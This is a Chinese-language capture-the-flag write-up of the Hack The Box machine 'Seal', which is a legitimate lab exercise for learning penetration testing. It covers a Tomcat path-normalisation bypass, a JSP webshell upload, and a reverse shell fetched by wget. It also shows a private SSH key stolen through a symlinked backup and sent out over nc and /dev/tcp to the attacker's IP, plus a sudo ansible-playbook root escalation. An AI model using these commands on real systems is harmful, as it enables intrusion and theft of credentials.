---
title: Seal (Hack The Box Writeup)
date: 2021-08-15T14:05:00+08:00
draft: false
url: "/2021/08/15/seal-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

> 
URL: https://app.hackthebox.eu/machines/Seal

IP : 10.10.10.250

## Recon

- 凡事都先從 掃 Port 開始`rustscan -a 10.10.10.250 -r 1-65535`![](/uploads/2022/02/3657e-ttUAJY6.png)找到 22 443 8080`nmap -A -p22,443,8080 10.10.10.250`- ![](/uploads/2022/02/36f55-xbNLfKt.png)
- 443 : nginx 1.18觀察 443 的 HTTPS 憑證- ![](/uploads/2022/02/890dd-GlMUdim.png)
- 網址應該是 `seal.htb`
- 加到 `/etc/hosts``10.10.10.250 seal.htb`觀察首頁- 443 port![](/uploads/2022/02/2b74e-oeQnmMF.png)8080 port- ![](/uploads/2022/02/677da-Fj9z7gv.png)
- 看起來是一個 Bit Bucket掃目錄- `python3 dirsearch.py -u https://seal.htb/`
- ![](/uploads/2022/02/21552-r7YSzQz.png)
- 發現有一些頁面 302 按進去又 404
- 而且首頁 nmap 明明就說是 nginx 這邊下面錯誤訊息卻跳 Tomcat![](/uploads/2022/02/32dfa-ZBJdb3i.png)apache tomcat 9.0.31 ??![](/uploads/2022/02/c5274-8P1DPrw.png)- nginx 1.18.0觀察 Bitbucket- 發現可以註冊帳號![](/uploads/2022/02/541fe-HcxyFnc.png)
- `meow` / `meow`
- ![](/uploads/2022/02/8d8c8-0Ny7NM5.png)成功登入- ![](/uploads/2022/02/54424-Sw6zuao.png)

## Hack Tomcat

- 可以發現原始碼與 Config 檔案都放在這邊![](/uploads/2022/02/ef798-QH4iA2I.png)
- 在 commit log 中可以找到 tomcat 帳密![](/uploads/2022/02/8f02e-TKVUn3Y.png)
- `tomcat`
- `42MrHBf*z8{Z%`嘗試進入 Tomcat 後台，卻發現 403- https://seal.htb/admin/dashboard
- ![](/uploads/2022/02/5099b-mPoScme.png)但發現 Tomcat 的 Status 可以用- https://seal.htb/manager/status/all
- ![](/uploads/2022/02/edb35-30ZnOf8.png)繼續翻 nginx 的 config- 發現他針對 nginx 有設定一個 ssl_client_verify![](/uploads/2022/02/ddf55-O4sB5Vl.png)這邊可以用 Orange 曾經介紹過的[手法](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)- 第 48 頁也就是網址透過 `..;` 截斷- https://seal.htb/manager/status/..;/html
- 就成功進入湯姆貓後台ㄌ!!![](/uploads/2022/02/59661-GbIHIvS.png)Tomcat 的後臺如果可以進入的話，代表可以上傳 jsp 的 webshell- 這邊我採用這個https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp`wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp``jar -cvf cmd.war cmd.jsp`![](/uploads/2022/02/964ae-5gC826l.png)然後在這邊上傳- ![](/uploads/2022/02/3b415-4D4t6pZ.png)上傳時仍然要注意 Bypass Path 的問題- Post 的路徑要是 `POST /manager/status/..;/html/upload`
- 這邊我用 Burp 來處理
- ![](/uploads/2022/02/c079a-Pdn4u3g.png)Web Shell 上傳成功- ![](/uploads/2022/02/a324f-LtoHrRk.png)
- https://seal.htb/cmd/cmd.jsp
- ![](/uploads/2022/02/7ecc8-vZnET4C.png)
- 也可以亂輸入指令ㄌ![](/uploads/2022/02/630d1-ZcRfen5.png)接下來準備 Reverse shell- `wget 10.10.16.5:8000/s_HTB -O /tmp/s`![](/uploads/2022/02/b0b6e-gXfTCmV.png)
- 確定真的有載到準備 `nc -vlk 7877` 來接`bash /tmp/s`- 成功收到!!
- ![](/uploads/2022/02/1fbda-Oxmqxcm.png)

## 提權

- 發現 user flag 沒有權限![](/uploads/2022/02/7c689-Jnpbv62.png)發現 `/var/www/keys` 裡面有一些 key- 不管，先打包回家慢慢看
- ![](/uploads/2022/02/3aded-GGWkL27.png)
- `tar cvf /tmp/keys.tar .`
- ![](/uploads/2022/02/d68d2-HIabUln.png)
- 用 nc 把檔案送回家![](/uploads/2022/02/74bfd-WQ9UlhD.png)
- ![](/uploads/2022/02/93dea-pB0KZjz.png)發現自簽憑證在裡面!- ![](/uploads/2022/02/2cef9-iqZ3nNG.png)
- `/var/www/keys/selfsigned-ca.crt;`那理論上我們可以用我們的瀏覽器綁自簽憑證ㄇ- 依照這邊的方法https://www.jscape.com/blog/firefox-client-certificate![](/uploads/2022/02/2ae84-CsWztGO.png)QAQ 看起來是不行嘗試 Linpeas- ![](/uploads/2022/02/9e455-QZI5bMG.png)
- ![](/uploads/2022/02/984c8-dLIe0kD.png)找到一個很新的備份檔案- `/opt/backups/archives/backup-2021-08-14-09:44:35.gz`
- ![](/uploads/2022/02/4ca43-lvDjHlj.png)
- ![](/uploads/2022/02/97211-0drtpc6.png)觀察備份檔路徑，發現會備份- `/var/lib/tomcat9/webapps/ROOT/admin/dashboard`
- ![](/uploads/2022/02/395f5-wxhkvBb.png)
- 是使用 `ansiple-playbook` 進行備份的可以用 ps 觀察到
- ![](/uploads/2022/02/3fa63-s9qxK5n.png)
- 他是用 `luis` 的權限執行的這邊可以先注意一下 `copy link = yes`- 等一下會運用到觀察 `ansible-playbook`- `/usr/bin/ansible-playbook`
- 到 `/usr/bin``ls -al | grep ansible-playbook`
- `ls -al | grep ansible`![](/uploads/2022/02/84020-GhQOmhL.png)
- 發現他會 link 到一個Python 檔案![](/uploads/2022/02/33cf0-XDs8mQg.png)裡面滿複雜的，應該不會要去 Exploit 他ㄅQQ- 而且相關目錄我們也都沒有權限開始通靈- 發現使用者的家目錄有一個 `.ssh`![](/uploads/2022/02/a0369-5Ke4grH.png)
- 猜他裡面可能有 `id_rsa` 可以偷
- 而 ansible-playbook 又可以備份 Link
- 所以我們可以把檔案 soft link 到備份的地方發現備份的目錄的 `uploads` 可寫- ![](/uploads/2022/02/8c5e0-SE6ybm4.png)
- `ln -s /home/luis/.ssh/id_rsa id_rsa`![](/uploads/2022/02/695c5-oCEWQAk.png)等待 30 秒產出新的備份檔案- ![](/uploads/2022/02/4b405-GNIk1o8.png)
- 用 nc 帶回家`nc -l -p 1234 > backup.gz`
- `cat backup-2021-08-14-10:21:33.gz > /dev/tcp/10.10.16.5/1234`發現真的有 `id_rsa`- ![](/uploads/2022/02/f0d21-L8tbcv2.png)
- 是 OpenSSH 的 private key![](/uploads/2022/02/a217f-owMnNYr.png)

## 使用者提權

- 使用 SSH 登入`ssh luis@seal.htb -i id_rsa`
- ![](/uploads/2022/02/863d2-ZsYnY63.png)取得 User Flag- ![](/uploads/2022/02/2af32-dp9qz6j.png)`sudo -l` 提權起手式- ![](/uploads/2022/02/8d636-QfBwQMZ.png)
- 發現可以使用 ansible-playbookGTFOBins 搜尋- 找到了 ansible-playbook 提權方法https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo`TF=$(mktemp)``echo '[{hosts: localhost, tasks: [shell: /bin/sh /dev/tty 2>/dev/tty]}]' >$TF``sudo ansible-playbook $TF`![](/uploads/2022/02/6b9bc-W8tUtIO.png)取得 Root Flag- ![](/uploads/2022/02/39bab-ku1ddc6.png)
- `b4890611a188410400d56e578f30979e`

## 心得

對於湯姆貓還是有一點陌生QQ，包含傳 jsp webshell 等部分，還有目錄截斷之類的也要多研究一下，這一題我覺得除了通靈 id_rsa 之外，整體來講題目滿好玩的！
